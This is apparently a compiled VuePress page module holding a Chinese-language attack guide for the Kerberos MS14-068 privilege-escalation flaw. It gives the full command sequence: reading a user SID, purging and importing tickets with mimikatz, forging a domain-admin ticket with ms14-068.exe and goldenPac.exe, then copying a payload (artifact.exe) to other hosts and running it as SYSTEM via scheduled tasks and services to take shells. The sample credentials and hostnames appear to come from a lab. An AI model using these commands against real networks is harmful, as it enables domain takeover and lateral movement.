import{_ as s,W as n,X as a,a1 as e}from"./framework-b6a07282.js";const t={},c=e(`<h2 id="ptt攻击之ms14-068" tabindex="-1"><a class="header-anchor" href="#ptt攻击之ms14-068" aria-hidden="true">#</a> PTT攻击之MS14-068</h2><ul><li>MS14-068漏洞主要通过伪造域管的TGT，将普通用户权限提权为域管权限，以此来控制域控。只要服务器没有打MS14-068(KB3011780)补丁，在Server 2000以上的域控服务器中，都可以利用。</li></ul><h3 id="利用条件" tabindex="-1"><a class="header-anchor" href="#利用条件" aria-hidden="true">#</a> 利用条件</h3><ol><li>获取域普通用户的账号密码</li><li>获取域普通用户的SID</li><li>服务器未打MS14-068(KB3011780)补丁</li></ol><h3 id="ms14-068攻击步骤" tabindex="-1"><a class="header-anchor" href="#ms14-068攻击步骤" aria-hidden="true">#</a> MS14-068攻击步骤</h3><ol><li>获取用户的SID whoami /all</li></ol><p>S-1-5-21-2618298010-4128509533-3101184725-1104</p><ol start="2"><li><p>读取用户的账号密码（域用户枚举+喷洒攻击） 默认已获得</p></li><li><p>清除内存中的票据 shell klist mimikatz kerberos::purge</p></li><li><p>上传ms14-068.exe</p></li><li><p>生成票据 ms14-068.exe -u 域用户@域名 -p 域用户密码 -s 域用户SID -d 域控主机名 ms14-068.exe -u <a href="mailto:dog1@hacker2.com">dog1@hacker2.com</a> -p Aa123456 -s S-1-5-21-2618298010-4128509533-3101184725-1104 -d myname2008r2</p></li><li><p>导入票据（攻击完成） mimikatz kerberos::ptc TGT_dog1@hacker2.com.ccache</p></li><li><p>上线域控</p></li></ol><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>执行各种命令
net <span class="token function">time</span> <span class="token punctuation">\\</span><span class="token punctuation">\\</span><span class="token number">192.168</span>.1.1 <span class="token comment">#查看时间</span>
tasklist /s <span class="token number">192.168</span>.1.1 <span class="token comment">#查看进程</span>
<span class="token function">dir</span> <span class="token punctuation">\\</span><span class="token punctuation">\\</span><span class="token number">192.168</span>.1.4<span class="token punctuation">\\</span>c$ <span class="token comment">#查看C盘</span>

<span class="token comment">#配合计划任务攻击夺取另一台内网机器的shell</span>
copy C:<span class="token punctuation">\\</span>Users<span class="token punctuation">\\</span>dog1<span class="token punctuation">\\</span>Desktop<span class="token punctuation">\\</span>artifact.exe <span class="token punctuation">\\</span><span class="token punctuation">\\</span>myname2008r2.hacker2.com<span class="token punctuation">\\</span>C$ <span class="token comment">#拷贝文件到目标主机C盘下</span>
schtasks /create /s myname2008r2.hacker2.com /tn shellname /sc onstart /tr c:<span class="token punctuation">\\</span>artifact.exe /ru system /f
schtasks /run /s myname2008r2.hacker2.com /i /tn <span class="token string">&quot;shellname&quot;</span>

schtasks /create /u administrator /p Aa123456 /s controlfish.hacker.com /tn shellname /sc onstart /tr c:<span class="token punctuation">\\</span>artifact.exe /ru system /f <span class="token comment">#创建计划任务</span>
schtasks /run /u administrator /p Aa123456 /s controlfish.hacker.com /i /tn <span class="token string">&quot;shellname&quot;</span> <span class="token comment">#运行计划任务</span>
schtasks /query /s controlfish.hacker.com /u administrator /p Aa123456 /TN c <span class="token comment">#查看计划任务</span>

SCHTASKS /DELETE /s myname2008r2.hacker2.com /TN <span class="token string">&quot;shellname&quot;</span> /f <span class="token comment">#强制删除计划任务</span>

<span class="token comment">#配合服务夺取另一台内网机器的shell</span>
sc <span class="token punctuation">\\</span><span class="token punctuation">\\</span><span class="token number">192.168</span>.1.4 create servername <span class="token assign-left variable">binpath</span><span class="token operator">=</span> <span class="token string">&quot;cmd.exe /c c:<span class="token entity" title="\\a">\\a</span>rtifact.exe&quot;</span> <span class="token comment">#创建服务</span>
sc <span class="token punctuation">\\</span><span class="token punctuation">\\</span><span class="token number">192.168</span>.1.4 start servername <span class="token comment">#启动服务</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3 id="goldenpac-exe攻击步骤" tabindex="-1"><a class="header-anchor" href="#goldenpac-exe攻击步骤" aria-hidden="true">#</a> goldenPac.exe攻击步骤</h3><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>goldenPac.exe 域名/域用户名:域用户明文密码@域控完整主机名
goldenPac.exe hacker2.com/dog1:Aa123456@myname2008r2.hacker2.com <span class="token comment">#攻击完成，在当前命令行即为域控system权限</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div>`,11),i=[c];function l(o,p){return n(),a("div",null,i)}const m=s(t,[["render",l],["__file","PTT攻击之MS14-068.html.vue"]]);export{m as default};
